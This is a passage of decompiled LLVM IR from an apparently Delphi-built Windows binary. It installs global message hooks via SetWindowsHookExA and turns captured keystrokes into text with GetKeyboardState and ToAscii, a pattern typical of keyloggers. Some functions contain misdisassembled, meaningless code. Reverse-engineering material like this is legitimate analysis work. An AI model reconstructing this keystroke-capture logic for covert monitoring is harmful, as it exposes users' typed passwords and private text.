  %0 = call i32 @"@HandleFinally"(), !insn.addr !679
  ret i32 %0, !insn.addr !679
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !680
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !681
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !682
  %2 = add i32 %1, -1, !insn.addr !682
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !682
  ret i32 %0, !insn.addr !683
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !684
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !685
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !685
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !685
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !686
  %4 = call i32 @function_407250(), !insn.addr !687
  %5 = icmp ne i32 %4, 0, !insn.addr !688
  %6 = icmp eq i1 %5, false, !insn.addr !689
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !690
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !690

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !691
  %8 = call i32 @"@LStrDelete"(), !insn.addr !692
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !693
  br label %dec_label_pc_4050bb, !insn.addr !693

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !694
  %10 = call i32 @"@LStrDelete"(), !insn.addr !695
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !696
  br label %dec_label_pc_4050bb, !insn.addr !696

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !697
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !698
  %14 = udiv i32 %1, 65536, !insn.addr !699
  %15 = and i32 %14, 255, !insn.addr !700
  %16 = inttoptr i32 %15 to i16*, !insn.addr !701
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !702
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !703
  %19 = icmp eq i32 %18, 1, !insn.addr !704
  %20 = icmp eq i1 %19, false, !insn.addr !705
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !705
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !705

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !706
  %22 = icmp eq i32 %21, 0, !insn.addr !707
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !708
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !708

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !709
  %24 = icmp sgt i32 %23, 15, !insn.addr !710
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !710
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !710

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !711
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !712
  %27 = call i32 @"@LStrInsert"(), !insn.addr !713
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !713
  br label %dec_label_pc_4050bb, !insn.addr !713

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !714
  %29 = load i32, i32* %28, align 4, !insn.addr !714
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !715
  %30 = add i32 %esp.0.reload, 8, !insn.addr !716
  %31 = inttoptr i32 %30 to i32*, !insn.addr !716
  store i32 4215003, i32* %31, align 4, !insn.addr !716
  %32 = call i32 @"@LStrClr"(), !insn.addr !717
  ret i32 %32, !insn.addr !718
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !719
  ret i32 %0, !insn.addr !719
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !720
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !721
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !722
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !722
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !722
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !723
  %2 = call i32 @function_407250(), !insn.addr !724
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !725
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !726
  %4 = add i32 %1, 8, !insn.addr !727
  %5 = inttoptr i32 %4 to i32*, !insn.addr !727
  store i32 4215210, i32* %5, align 4, !insn.addr !727
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !728
  ret i32 %6, !insn.addr !729
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !730
  ret i32 %0, !insn.addr !730
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !731
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !732
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !733
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !734
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !734
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !734
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !735
  %3 = call i32 @function_4071c0(), !insn.addr !736
  %4 = icmp eq i32 %3, 0, !insn.addr !737
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !738
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !738

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !739
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !740
  %7 = ptrtoint i32* %6 to i32, !insn.addr !740
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !741
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !741
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !742
  %10 = icmp eq i1 %9, false, !insn.addr !743
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !744

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !745
  %12 = call i32 @"@LStrAsg"(), !insn.addr !746
  %13 = call i32 @function_407348(), !insn.addr !747
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !748
  br label %dec_label_pc_405214, !insn.addr !748

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !749
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !749
  br label %dec_label_pc_405214, !insn.addr !749

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !750
  %16 = load i32, i32* %15, align 4, !insn.addr !750
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !751
  %17 = add i32 %esp.0.reload, 8, !insn.addr !752
  %18 = inttoptr i32 %17 to i32*, !insn.addr !752
  store i32 4215345, i32* %18, align 4, !insn.addr !752
  %19 = call i32 @"@LStrClr"(), !insn.addr !753
  ret i32 %19, !insn.addr !754
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !755
  ret i32 %0, !insn.addr !755
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !756
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !757
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !758
  %8 = inttoptr i32 %4 to i8*, !insn.addr !758
  store i8 %7, i8* %8, align 1, !insn.addr !758
  %9 = add i32 %2, 111, !insn.addr !759
  %10 = inttoptr i32 %9 to i8*, !insn.addr !759
  %11 = load i8, i8* %10, align 1, !insn.addr !759
  %12 = load i32, i32* %eax, align 4, !insn.addr !759
  %13 = trunc i32 %12 to i8, !insn.addr !759
  %14 = add i8 %11, %13, !insn.addr !759
  store i8 %14, i8* %10, align 1, !insn.addr !759
  %15 = trunc i32 %3 to i16, !insn.addr !760
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !760
  %17 = inttoptr i32 %0 to i32*, !insn.addr !760
  store i32 %16, i32* %17, align 4, !insn.addr !760
  %18 = add i32 %0, 66, !insn.addr !761
  %19 = inttoptr i32 %18 to i64*, !insn.addr !761
  %20 = load i64, i64* %19, align 4, !insn.addr !761
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !761
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !762
  %22 = load i8, i8* %5, align 4, !insn.addr !763
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !763
  %25 = add i8 %22, %24, !insn.addr !763
  %26 = inttoptr i32 %23 to i8*, !insn.addr !763
  store i8 %25, i8* %26, align 1, !insn.addr !763
  %27 = add i32 %21, -117, !insn.addr !764
  %28 = inttoptr i32 %27 to i8*, !insn.addr !764
  %29 = load i8, i8* %28, align 1, !insn.addr !764
  %30 = trunc i32 %3 to i8, !insn.addr !764
  %31 = add i8 %29, %30, !insn.addr !764
  store i8 %31, i8* %28, align 1, !insn.addr !764
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !765
  %33 = add i32 %21, 16, !insn.addr !766
  %34 = inttoptr i32 %33 to i32*, !insn.addr !766
  %35 = load i32, i32* %34, align 4, !insn.addr !766
  %36 = add i32 %21, 12, !insn.addr !767
  %37 = inttoptr i32 %36 to i32*, !insn.addr !767
  %38 = load i32, i32* %37, align 4, !insn.addr !767
  %39 = add i32 %21, 8, !insn.addr !768
  %40 = inttoptr i32 %39 to i32*, !insn.addr !768
  %41 = load i32, i32* %40, align 4, !insn.addr !768
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !769
  %43 = inttoptr i32 %42 to i32*, !insn.addr !770
  %44 = load i32, i32* %43, align 4, !insn.addr !770
  %45 = icmp eq i32 %44, 0, !insn.addr !770
  %46 = icmp eq i1 %45, false, !insn.addr !771
  %47 = icmp eq i32 %41, 0, !insn.addr !772
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !773
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !774

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !775
  %51 = add i32 %35, 4, !insn.addr !776
  %52 = inttoptr i32 %51 to i32*, !insn.addr !776
  %53 = load i32, i32* %52, align 4, !insn.addr !776
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !777
  br label %dec_label_pc_40529a, !insn.addr !778

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !779
  br label %dec_label_pc_40529a, !insn.addr !779

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !780
  %57 = inttoptr i32 %35 to i32*, !insn.addr !781
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !781
  ret i32 %58, !insn.addr !782
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !783
  %5 = icmp eq i1 %4, false, !insn.addr !784
  %6 = icmp eq i32 %arg3, 0, !insn.addr !785
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !786

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !787
  %9 = inttoptr i32 %8 to i32*, !insn.addr !787
  %10 = load i32, i32* %9, align 4, !insn.addr !787
  %11 = icmp eq i32 %10, 2, !insn.addr !788
  %12 = icmp eq i1 %11, false, !insn.addr !789
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !789

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !790
  br label %dec_label_pc_4052e0, !insn.addr !790

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !791
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !792
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !792
  ret i32 %16, !insn.addr !793
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !794
  %2 = ptrtoint i32* %1 to i32, !insn.addr !794
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !795
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !796
  %5 = ptrtoint i32* %4 to i32, !insn.addr !796
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !797
  ret i32 %5, !insn.addr !798
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !799
  %1 = inttoptr i32 %0 to i32*, !insn.addr !800
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !800
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !801
  %4 = inttoptr i32 %3 to i32*, !insn.addr !802
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !802
  %6 = sext i1 %5 to i32, !insn.addr !802
  ret i32 %6, !insn.addr !803
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !804
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !804
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !804
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !805
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !806
  %3 = add i32 %2, 1, !insn.addr !806
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !806
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !807
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !808
  ret i32 0, !insn.addr !809
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !810
  ret i32 %0, !insn.addr !810
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !811
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !812
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !813
  %2 = add i32 %1, -1, !insn.addr !813
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !813
  ret i32 %0, !insn.addr !814
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !815
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !815
  %5 = inttoptr i32 %3 to i32*, !insn.addr !815
  store i32 %4, i32* %5, align 4, !insn.addr !815
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !816
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !816
  %10 = add i8 %7, %9, !insn.addr !816
  %11 = inttoptr i32 %8 to i8*, !insn.addr !816
  store i8 %10, i8* %11, align 1, !insn.addr !816
  %12 = load i32, i32* %eax, align 4, !insn.addr !817
  store i32 %arg1, i32* %eax, align 4, !insn.addr !818
  %13 = add i32 %12, 99, !insn.addr !819
  %14 = inttoptr i32 %13 to i64*, !insn.addr !819
  %15 = load i64, i64* %14, align 4, !insn.addr !819
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !819
  %17 = add i32 %16, -2, !insn.addr !820
  %18 = inttoptr i32 %17 to i16*, !insn.addr !820
  store i16 27241, i16* %18, align 2, !insn.addr !820
  %19 = mul i32 %2, 2, !insn.addr !821
  %20 = add i32 %2, 110, !insn.addr !821
  %21 = add i32 %20, %19, !insn.addr !821
  %22 = inttoptr i32 %21 to i32*, !insn.addr !821
  %23 = load i32, i32* %22, align 4, !insn.addr !821
  %24 = sext i32 %23 to i64, !insn.addr !821
  %25 = mul nsw i64 %24, 111, !insn.addr !821
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !821
  %28 = icmp eq i64 %25, %27, !insn.addr !821
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !822

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !823
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !824

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !823
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !825

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !823
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !570, !insn.addr !823
  %33 = and i8 %32, 1, !insn.addr !823
  %34 = icmp eq i8 %33, 0, !insn.addr !823
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !826

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !817
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !827
  %37 = load i32, i32* %36, align 4, !insn.addr !827
  %38 = xor i32 %37, %1, !insn.addr !827
  store i32 %38, i32* %36, align 4, !insn.addr !827
  %39 = add i32 %1, 959985462, !insn.addr !828
  %40 = inttoptr i32 %39 to i32*, !insn.addr !828
  %41 = load i32, i32* %40, align 4, !insn.addr !828
  %42 = xor i32 %41, %1, !insn.addr !828
  %43 = add i32 %16, -38, !insn.addr !829
  %44 = inttoptr i32 %43 to i32*, !insn.addr !829
  store i32 %35, i32* %44, align 4, !insn.addr !829
  %45 = add i32 %16, -42, !insn.addr !830
  %46 = inttoptr i32 %45 to i32*, !insn.addr !830
  store i32 %42, i32* %46, align 4, !insn.addr !830
  %47 = add i32 %16, -22, !insn.addr !831
  %48 = inttoptr i32 %47 to i32*, !insn.addr !831
  store i32 0, i32* %48, align 4, !insn.addr !831
  %49 = add i32 %16, -26, !insn.addr !832
  %50 = inttoptr i32 %49 to i32*, !insn.addr !832
  store i32 0, i32* %50, align 4, !insn.addr !832
  %51 = add i32 %16, -30, !insn.addr !833
  %52 = inttoptr i32 %51 to i32*, !insn.addr !833
  store i32 0, i32* %52, align 4, !insn.addr !833
  %53 = add i32 %16, -34, !insn.addr !834
  %54 = inttoptr i32 %53 to i32*, !insn.addr !834
  store i32 0, i32* %54, align 4, !insn.addr !834
  %55 = add i32 %16, -6, !insn.addr !835
  %56 = inttoptr i32 %55 to i32*, !insn.addr !835
  store i32 %arg3, i32* %56, align 4, !insn.addr !835
  %57 = add i32 %16, -46, !insn.addr !836
  %58 = inttoptr i32 %57 to i32*, !insn.addr !836
  store i32 %17, i32* %58, align 4, !insn.addr !836
  ret i32 0, !insn.addr !836

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !837
  %60 = trunc i64 %25 to i32, !insn.addr !821
  %61 = load i32, i32* %eax, align 4, !insn.addr !838
  %62 = add i32 %61, 1, !insn.addr !838
  %63 = mul i32 %59, 8, !insn.addr !839
  %64 = add i32 %59, 48, !insn.addr !839
  %65 = add i32 %64, %63, !insn.addr !839
  %66 = inttoptr i32 %65 to i8*, !insn.addr !839
  %67 = load i8, i8* %66, align 4, !insn.addr !839
  %68 = udiv i32 %62, 256, !insn.addr !839
  %69 = trunc i32 %68 to i8, !insn.addr !839
  %70 = add i8 %67, %69, !insn.addr !839
  store i8 %70, i8* %66, align 4, !insn.addr !839
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !840
  %71 = call i32 @"@LStrClr"(), !insn.addr !841
  %72 = call i32 @function_4034c8(), !insn.addr !842
  %73 = add i32 %60, -8, !insn.addr !843
  %74 = inttoptr i32 %73 to i32*, !insn.addr !843
  store i32 %72, i32* %74, align 4, !insn.addr !843
  %75 = ashr i32 %72, 31, !insn.addr !844
  %76 = zext i32 %72 to i64, !insn.addr !845
  %77 = zext i32 %75 to i64, !insn.addr !845
  %78 = mul i64 %77, 4294967296, !insn.addr !845
  %79 = or i64 %78, %76, !insn.addr !845
  %80 = sdiv i64 %79, 3, !insn.addr !845
  %81 = trunc i64 %80 to i32, !insn.addr !845
  store i32 %81, i32* %eax, align 4, !insn.addr !845
  %82 = srem i64 %79, 3, !insn.addr !845
  %83 = trunc i64 %82 to i32, !insn.addr !845
  %84 = icmp eq i32 %83, 0, !insn.addr !846
  %85 = icmp eq i1 %84, false, !insn.addr !847
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !847

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !848
  %87 = ashr i32 %86, 31, !insn.addr !849
  %88 = zext i32 %86 to i64, !insn.addr !850
  %89 = zext i32 %87 to i64, !insn.addr !850
  %90 = mul i64 %89, 4294967296, !insn.addr !850
  %91 = or i64 %90, %88, !insn.addr !850
  %92 = sdiv i64 %91, 3, !insn.addr !850
  %93 = trunc i64 %92 to i32, !insn.addr !850
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !851
  br label %dec_label_pc_405430, !insn.addr !851

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !851

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !852
  ret i32 %94, !insn.addr !852

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !853
  %96 = zext i32 %95 to i64, !insn.addr !853
  %97 = zext i32 %arg3 to i64, !insn.addr !853
  %98 = mul i64 %97, 4294967296, !insn.addr !853
  %99 = or i64 %98, %96, !insn.addr !853
  %100 = zext i32 %arg2 to i64, !insn.addr !853
  %101 = sdiv i64 %99, %100, !insn.addr !853
  %102 = trunc i64 %101 to i32, !insn.addr !853
  %103 = add i32 %102, 1, !insn.addr !854
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !854
  br label %dec_label_pc_405430, !insn.addr !854

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !855
  ret i32 %104, !insn.addr !856

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !857
  %106 = load i32, i32* %105, align 4, !insn.addr !857
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !857
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !858
  %109 = load i32, i32* %108, align 4, !insn.addr !858
  %110 = add i32 %109, %107, !insn.addr !858
  store i32 %110, i32* %108, align 4, !insn.addr !858
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !859
  %113 = inttoptr i32 %112 to i8*, !insn.addr !859
  %114 = load i8, i8* %113, align 1, !insn.addr !859
  %115 = trunc i32 %111 to i8, !insn.addr !859
  %116 = add i8 %114, %115, !insn.addr !859
  store i8 %116, i8* %113, align 1, !insn.addr !859
  %117 = load i32, i32* %eax, align 4, !insn.addr !860
  ret i32 %117, !insn.addr !860
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !861
  %esp.0.reg2mem = alloca i32, !insn.addr !861
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !862
  %3 = inttoptr i32 %2 to i32*, !insn.addr !862
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !863
  %13 = inttoptr i32 %12 to i32*, !insn.addr !863
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
